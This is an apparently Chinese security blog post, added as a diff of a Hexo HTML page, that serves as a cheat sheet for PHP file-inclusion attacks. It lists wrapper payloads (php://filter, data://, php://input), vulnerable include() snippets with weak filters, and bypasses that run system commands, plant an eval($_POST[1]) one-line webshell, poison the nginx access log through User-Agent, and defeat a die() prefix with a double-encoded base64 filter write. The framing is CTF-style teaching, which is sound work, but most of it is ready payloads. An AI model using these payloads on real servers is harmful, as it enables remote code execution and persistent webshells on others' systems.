@@ -1,0 +1,624 @@
+
+
+<!DOCTYPE html>
+<html lang="en-US" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/images/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="zkuan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="File Include Base">
+<meta property="og:type" content="article">
+<meta property="og:title" content="File Include">
+<meta property="og:url" content="https://whoiszkuan.github.io/2022/01/10/File-Include/index.html">
+<meta property="og:site_name" content="4CH4N ZKUAN">
+<meta property="og:description" content="File Include Base">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-24_10-442021-11-24.png">
+<meta property="article:published_time" content="2022-01-10T13:18:47.000Z">
+<meta property="article:modified_time" content="2022-01-22T13:26:13.109Z">
+<meta property="article:author" content="zkuan">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-24_10-442021-11-24.png">
+  
+  
+  <title>File Include - 4CH4N ZKUAN</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1/themes/prism-okaidia.min.css" />
+      
+      
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1/plugins/line-numbers/prism-line-numbers.min.css" />
+      
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"whoiszkuan.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="4CH4N ZKUAN" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0x95cn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Startseite
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archiv
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Kategorie
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Etiketten
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                Über mich
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/images/banner1.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="File Include">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-10 21:18" pubdate>
+        January 10, 2022 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.5k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      29 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">File Include</h1>
+            
+            <div class="markdown-body">
+              <h1 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h1><ul>
+<li>Include</li>
+<li>Include_once</li>
+<li>require</li>
+<li>require_once</li>
+<li>hightlight_file,show_source,readfile,file_get_contents,fopen,file</li>
+</ul>
+<h1 id="利用方式-伪协议"><a href="#利用方式-伪协议" class="headerlink" title="利用方式-伪协议"></a>利用方式-伪协议</h1><table>
+<thead>
+<tr>
+<th align="left">协议</th>
+<th>测试PHP版本</th>
+<th>allow_url_fopen</th>
+<th align="left">allow_url_include</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">file://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td align="left">off/on</td>
+<td>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</td>
+</tr>
+<tr>
+<td align="left">php://filter</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td align="left">off/on</td>
+<td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td>
+</tr>
+<tr>
+<td align="left">php://input</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td align="left">on</td>
+<td>?file=php://input [POST DATA] &lt;?php phpinfo()?&gt;</td>
+</tr>
+<tr>
+<td align="left">zip://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td align="left">off/on</td>
+<td>?file=zip://D:/sort/phpStudy/WWW/file.zip%23phpcode.txt</td>
+</tr>
+<tr>
+<td align="left">compress.bzip2://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td align="left">off/on</td>
+<td>?file=compress.bzip2://D:/soft/phpstudy/WWW/file.bz2<br />[or] <br />?file=compress.bzip2://./file.bz2</td>
+</tr>
+<tr>
+<td align="left">compress.zlib://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td align="left">off/on</td>
+<td>?file=compress.zlib://D:/soft/phpstudy/WWW/file.gz<br />[or]<br />?file=compress.zlib://./file.gz</td>
+</tr>
+<tr>
+<td align="left">data://</td>
+<td>&gt;=5.2</td>
+<td>on</td>
+<td align="left">on</td>
+<td>?file=data://text/plain,&lt;?php phpinfo()?&gt;<br />?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs=<br />?file=data:text/plain,&lt;?php phpinfo()?&gt;<br />?file=data:text/plain;base64.PDFfasdfDFsdSF=</td>
+</tr>
+</tbody></table>
+<p>php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用</p>
+<p>data://同样类似于php://input，可以让用户来控制输入流</p>
+<p>php://input可以访问请求的原始数据的只读流，将post请求的数据当做php代码执行</p>
+<p>phar://xxx.png/shell.php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压</p>
+<h1 id="无过滤文件包含"><a href="#无过滤文件包含" class="headerlink" title="无过滤文件包含"></a>无过滤文件包含</h1><p>通过<code>../</code>返回上一级目录查找敏感文件</p>
+<p><code>http://127.0.0.1:8081/LFI-1/?page=../phpinfo.php</code></p>
+<div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;
+    $file &#x3D; $_GET[&#39;file&#39;];
+    include($file);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>无过滤，利用<code>php://filter</code></p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p>也可使用<code>data://</code></p>
+<p><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs=</code></p>
+<p><code>?file=data://text/plain,&lt;?php system(&#39;cat flag.php&#39;)?&gt;</code></p>
+<h1 id="PHP关键字过滤"><a href="#PHP关键字过滤" class="headerlink" title="PHP关键字过滤"></a>PHP关键字过滤</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;
+    $file &#x3D; $_GET[&#39;file&#39;];
+    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    include($file);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>代码中将PHP过滤替换为???</p>
+<p>使用<code>data://</code></p>
+<p><code>?file=data://text/plain,&lt;?= system(&#39;tac flag.php&#39;);?&gt;</code></p>
+<p><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</code></p>
+<p>写一句话木马：</p>
+<p><code>?file=data://text/plain,&lt;?= eval($_POST[1]);?&gt;</code></p>
+<p>POST参数<code>1=phpinfo();</code></p>
+<h1 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h1><p>知道日志文件的存放路径，通过User-Agent插入payload</p>
+<p>include加载的文件都会当做PHP进行解析。如果文件中有PHP代码，就会执行PHP代码。不是PHP代码的部分就会直接输出。</p>
+<p>Nginx的日志文件是/var/log/nginx/access.log，对服务器的请求都会记录到日志文件中去，所以构造一个有马的请求(<code>&lt;?php eval($_POST[1]);?&gt;</code>)，再用file包含日志文件。所以就可以执行拿到shell了。</p>
+<div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;
+    $file &#x3D; $_GET[&#39;file&#39;];
+    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
+    include($file);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>日志文件路径：<code>?file=/var/log/nginx/access.log</code></p>
+<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-24_10-442021-11-24.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><h1 id="die绕过"><a href="#die绕过" class="headerlink" title="die绕过"></a>die绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;
+    $file &#x3D; $_GET[&#39;file&#39;];
+    $content &#x3D; $_POST[&#39;content&#39;];
+    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);
+    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);
+
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<blockquote>
+<p>GET<br>file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2561%252e%2570%2568%2570<br>// file=php://filter/write=convert.base64-decode/resource=a.php<br>POST<br>content=11PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==<br>其中PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==是”<?php eval($_POST[1]);"的base64编码。前面的11是为了填充"<?php die('大佬别秀了');?>“<br>base64 4位4位解码，其中”<?php die('大佬别秀了');?>“解码的内容其实只有phpdie，所以需要再填充两位。<br>//content=&lt;?php eval($_POST[1]);</p>
+</blockquote>
+<h1 id="data-base64绕过"><a href="#data-base64绕过" class="headerlink" title="data base64绕过"></a>data base64绕过</h1><p><code>data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw</code></p>
+<p><code>PD9waHAgZXZhbCgkX1BPU1RbMV0pOw</code> 为<code>&lt;?php eval($_POST[1]);</code>的base64编码</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/WebSec/">WebSec</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Security/">Security</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/01/22/JsonWebToken-JWT/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JsonWebToken(JWT)</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/09/Directory-Traversal/">
+                        <span class="hidden-mobile">Directory Traversal</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+    
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
